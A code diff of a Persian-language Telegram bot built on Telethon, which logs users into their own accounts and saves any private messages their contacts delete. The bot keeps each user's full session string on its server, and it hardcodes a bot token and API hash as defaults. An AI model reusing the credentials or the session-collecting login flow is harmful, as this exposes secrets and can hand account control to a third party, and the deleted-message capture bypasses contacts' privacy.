@@ -4,12 +4,11 @@ from telethon.sessions import StringSession, MemorySession
 import asyncio
 import os
 
-# خواندن مقادیر از متغیرهای محیطی Railway
+# خواندن مقادیر از متغیرهای محیطی
 BOT_TOKEN = os.getenv("BOT_TOKEN", "9024595880:AAHT2b4wpWNu-gULwbrBj09AjNUDWZQUoLE")
 API_ID = int(os.getenv("API_ID", 2040))
 API_HASH = os.getenv("API_HASH", "b18441a1ff607e10a989891a5462e627")
 
-# --- اتصال مستقیم به تلگرام (بدون پروکسی) ---
 print("Connecting directly to Telegram...")
 bot = TelegramClient(
     MemorySession(), API_ID, API_HASH
@@ -28,7 +27,7 @@ async def start(event):
     user_id = event.sender_id
     user_states[user_id] = 'waiting_phone'
     await event.reply(
-        "📱 **ربات ذخیره‌ساز پیام**\n\n"
+        "📱 **ربات ذخیره‌ساز پیام‌های حذف شده**\n\n"
         "لطفاً شماره موبایلت رو به صورت بین‌المللی بفرست:\n"
         "مثال: `98912XXXXXXX`\n\n"
         "⚠️ **مهم:** بعد از دریافت کد، آن را سریع (زیر ۱ دقیقه) بفرست تا منقضی نشود."
@@ -71,11 +70,18 @@ async def handler(event):
     if state == 'waiting_phone':
         phone = text
         try:
-            # اتصال کاربر بدون پروکسی
             user_client = TelegramClient(
                 StringSession(), API_ID, API_HASH
             )
             await user_client.connect()
+            
+            # --- رفع باگ لاگین: بررسی اینکه آیا اکانت از قبل لاگین هست یا نه ---
+            if await user_client.is_user_authorized():
+                active_clients[user_id] = user_client
+                await _login_success(event, user_id, user_client)
+                return
+            # -------------------------------------------------------------------
+
             active_clients[user_id] = user_client
             
             await event.reply("🔄 در حال ارسال کد...")
@@ -150,6 +156,7 @@ async def handler(event):
             
         await _login_success(event, user_id, client)
 
+
 async def _login_success(event, user_id, client):
     session_string = client.session.save()
     session_path = f'users_data/user_{user_id}.session'
@@ -157,25 +164,51 @@ async def _login_success(event, user_id, client):
         f.write(session_string)
 
     user_states.pop(user_id, None)
-    await event.reply("✅ با موفقیت وارد شدی!\nحالا از این به بعد، **هر پیامی** که مخاطبینت بهت بفرستن، بلافاصله یه کپی ازش توی سیو مسیج خودت ذخیره میشه. اگه پاکش کنن، نسخه سیو مسیج سالم می‌مونه.")
+    await event.reply("✅ با موفقیت وارد شدی!\nحالا از این به بعد، **فقط پیام‌هایی که مخاطبینت می‌فرستن و بعد پاک می‌کنن**، توی سیو مسیج خودت ذخیره میشن. (پیام‌های عادی کاری بهشون ندارم).")
     
+    # 📦 دیکشنری برای نگه داشتن موقت پیام‌ها تا ببینیم حذف میشن یا نه
+    recent_messages = {}
+
     @client.on(events.NewMessage(incoming=True))
-    async def save_immediately(msg_event):
+    async def cache_messages(msg_event):
+        # فقط چت‌های خصوصی
         if not msg_event.is_private:
             return
             
-        try:
-            await client.forward_messages('me', msg_event.message)
-            print(f"Message from {msg_event.sender_id} saved to Saved Messages.")
-        except Exception as e:
-            print(f"Could not forward: {e}")
-            try:
-                sender = await msg_event.get_sender()
-                sender_name = getattr(sender, 'first_name', 'Unknown') if sender else 'Unknown'
-                text_content = msg_event.text or "📷 [Media / File]"
-                await client.send_message('me', f"⚠️ پیام از {sender_name}:\n\n{text_content}")
-            except:
-                pass
+        # ذخیره پیام در حافظه موقت
+        recent_messages[(msg_event.chat_id, msg_event.id)] = msg_event.message
+        
+        # جلوگیری از پر شدن حافظه (فقط ۱۰۰۰ پیام آخر هر کاربر رو نگه می‌داریم)
+        if len(recent_messages) > 1000:
+            oldest_key = next(iter(recent_messages))
+            del recent_messages[oldest_key]
+
+    # 🗑️ شنونده برای پیام‌های حذف شده
+    @client.on(events.MessageDeleted)
+    async def on_message_deleted(deleted_event):
+        for msg_id in deleted_event.deleted_ids:
+            chat_id = deleted_event.chat_id
+            
+            # پیدا کردن پیام در حافظه موقت
+            key = (chat_id, msg_id)
+            if key in recent_messages:
+                deleted_msg = recent_messages[key]
+                
+                try:
+                    # فوروارد کردن پیام حذف شده به سیو مسیج
+                    await client.forward_messages('me', deleted_msg)
+                    print(f"Saved deleted message {msg_id} from chat {chat_id}")
+                except Exception as e:
+                    print(f"Could not forward deleted message: {e}")
+                    # اگر فوروارد نشد، حداقل متنش رو بفرست
+                    try:
+                        text_content = deleted_msg.text or "📷 [Media / File]"
+                        await client.send_message('me', f"🗑️ **پیام حذف شده:**\n\n{text_content}")
+                    except:
+                        pass
+                
+                # پاک کردن از حافظه بعد از ذخیره
+                del recent_messages[key]
 
     asyncio.create_task(client.run_until_disconnected())
 
